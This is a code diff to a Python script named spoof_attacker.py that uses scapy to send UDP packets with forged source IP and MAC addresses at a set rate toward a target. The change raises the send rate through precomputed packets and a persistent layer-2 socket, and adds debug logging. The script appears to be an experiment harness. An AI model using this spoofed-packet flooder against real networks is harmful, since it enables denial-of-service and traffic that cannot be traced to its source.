@@ -62,7 +62,8 @@ _dbg(
 
 import yaml
 try:
-    from scapy.all import Ether, IP, UDP, Raw, sendp
+    from scapy.all import Ether, IP, UDP, Raw, sendp  # sendp used only if L2socket path fails
+    from scapy.config import conf as _scapy_conf
     # #region agent log
     _dbg(
         "src/spoof_attacker.py:scapy_import",
@@ -169,6 +170,43 @@ def main():
     payload = b"S" * payload_size
     iface = _iface()
 
+    # Precompute raw bytes for each identity so the hot loop avoids
+    # per-packet scapy construction. Single-identity is just a 1-element list.
+    def _mk_pkt_bytes(src_ip, src_mac):
+        return bytes(
+            Ether(src=src_mac, dst=dst_mac)
+            / IP(src=src_ip, dst=dst_ip)
+            / UDP(sport=src_port, dport=target_port)
+            / Raw(load=payload)
+        )
+    identity_pkts = [_mk_pkt_bytes(ip, mac) for (ip, mac) in identities]
+
+    # Open a persistent L2 socket on the host's interface so we don't pay the
+    # open/close/bind cost per packet (that was the ~50 pps cap).
+    try:
+        l2sock = _scapy_conf.L2socket(iface=iface)
+        use_l2 = True
+    except Exception as _e:
+        l2sock = None
+        use_l2 = False
+        print(f"[spoofer] L2socket open failed ({_e}); falling back to sendp()", file=sys.stderr)
+    # #region agent log
+    _dbg(
+        "src/spoof_attacker.py:socket_ready",
+        "spoof send path ready",
+        data={
+            "iface": iface,
+            "use_l2_persistent_socket": use_l2,
+            "n_identities": len(identities),
+            "target_pps": pps,
+            "payload_bytes": len(payload),
+            "many_identities": many,
+        },
+        hypothesisId="H3_rate_capped",
+        runId="post-fix",
+    )
+    # #endregion
+
     manifest = {
         "run_id": run_id,
         "t_start_wall_iso": datetime.now(timezone.utc).isoformat(),
@@ -212,21 +250,26 @@ def main():
             if now < next_send:
                 time.sleep(next_send - now)
 
-            src_ip, src_mac = identities[i % len(identities)]
+            idx = i % len(identity_pkts)
             i += 1
-            pkt = (
-                Ether(src=src_mac, dst=dst_mac)
-                / IP(src=src_ip, dst=dst_ip)
-                / UDP(sport=src_port, dport=target_port)
-                / Raw(load=payload)
-            )
+            pkt_bytes = identity_pkts[idx]
             try:
-                sendp(pkt, iface=iface, verbose=False)
+                if use_l2:
+                    l2sock.send(pkt_bytes)
+                else:
+                    src_ip, src_mac = identities[idx]
+                    pkt = (
+                        Ether(src=src_mac, dst=dst_mac)
+                        / IP(src=src_ip, dst=dst_ip)
+                        / UDP(sport=src_port, dport=target_port)
+                        / Raw(load=payload)
+                    )
+                    sendp(pkt, iface=iface, verbose=False)
             except OSError as e:
-                print(f"[spoofer] sendp error: {e}", file=sys.stderr)
+                print(f"[spoofer] send error: {e}", file=sys.stderr)
                 break
             sent += 1
-            bytes_sent += len(payload) + 42  # rough Ethernet + IP + UDP overhead
+            bytes_sent += len(pkt_bytes) if use_l2 else (len(payload) + 42)
             next_send += interval
 
             # Avoid catch-up spiral.
@@ -252,10 +295,16 @@ def main():
         rate_w.writerow([f"{elapsed:.4f}", sent, bytes_sent, "0.00", len(identities)])
         rate_fh.flush()
         rate_fh.close()
+        if use_l2 and l2sock is not None:
+            try:
+                l2sock.close()
+            except Exception:
+                pass
         mean_pps = sent / elapsed if elapsed > 0 else 0.0
         (log_dir / "spoofer_summary.json").write_text(json.dumps({
             "run_id": run_id,
             "mode": "many_identities" if many else "single_identity",
+            "target_pps": pps,
             "duration_s": elapsed,
             "sent": sent,
             "bytes_sent": bytes_sent,
@@ -263,6 +312,24 @@ def main():
             "distinct_identities": len(identities),
             "exit_reason": exit_reason["v"],
         }, indent=2))
+        # #region agent log
+        _dbg(
+            "src/spoof_attacker.py:exit",
+            "spoof_attacker finished",
+            data={
+                "sent": sent,
+                "bytes_sent": bytes_sent,
+                "elapsed_s": elapsed,
+                "mean_pps": mean_pps,
+                "target_pps": pps,
+                "use_l2_persistent_socket": use_l2,
+                "n_identities": len(identities),
+                "exit_reason": exit_reason["v"],
+            },
+            hypothesisId="H3_rate_capped",
+            runId="post-fix",
+        )
+        # #endregion
         print(
             f"[spoofer] sent={sent} bytes={bytes_sent} "
             f"elapsed={elapsed:.2f}s mean_pps={mean_pps:.2f} "
